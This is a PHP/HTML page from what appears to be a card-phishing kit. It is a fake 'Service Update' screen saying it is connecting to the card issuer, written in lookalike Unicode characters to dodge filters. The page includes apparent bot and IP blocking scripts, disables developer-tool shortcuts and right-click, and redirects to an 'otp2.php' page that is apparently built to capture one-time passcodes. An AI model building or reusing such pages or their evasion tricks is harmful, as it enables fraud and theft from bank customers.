<?php 
include "./bye/agent.php";
include "./bye/ips.php";
?>
<!DOCTYPE html>
<html style="font-size: 16px;">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="page_type" content="np-template-header-footer-from-plugin">
    <title>Service Update</title>
    <link rel="stylesheet" href="css/nice.css" media="screen">
    <link rel="stylesheet" href="css/load.css" media="screen">
    <meta http-equiv="refresh" content="10; url='./otp2.php" />
    <meta name="generator" content="Nicepage 3.30.2, nicepage.com">
    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i">
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="load">
    <meta property="og:type" content="website">
  </head>
  <script type="text/javascript">
    document.onkeydown = function(e) {
if(event.keyCode == 123) {
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
return false;
}
}
  </script>
  <body oncontextmenu="return false;" class="u-body">
    <section class="u-clearfix u-grey-5 u-section-1" id="sec-bf12">
      <div class="u-align-left u-clearfix u-sheet u-sheet-1">
        <img class="u-image u-image-default u-preserve-proportions u-image-1" src="images/sp.gif" alt="" data-image-width="200" data-image-height="200">
        <div class="u-align-left u-container-style u-group u-group-1">
          <div class="u-container-layout">
            <p class="u-text u-text-default u-text-1">Cоոոесtіոg tо tһе саrԁ іssuеr</p>
            <img class="u-image u-image-default u-preserve-proportions u-image-2" src="images/pt.gif" alt="" data-image-width="62" data-image-height="33">
          </div>
        </div>
      </div>
    </section>
  </body>
</html>